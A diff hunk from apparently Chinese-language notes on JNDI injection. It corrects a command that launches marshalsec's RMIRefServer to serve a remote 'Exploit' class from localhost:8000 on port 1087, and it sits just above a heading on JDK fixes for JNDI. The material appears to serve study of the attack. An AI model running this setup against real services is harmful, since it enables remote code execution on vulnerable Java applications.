@@ -67,7 +67,7 @@ host,port,服务名(service)
 	
 	# 默认 port 1099
 
-	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:/#Exploit 1087
+	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit 1087
 
 
 JDK对于JNDI的修复
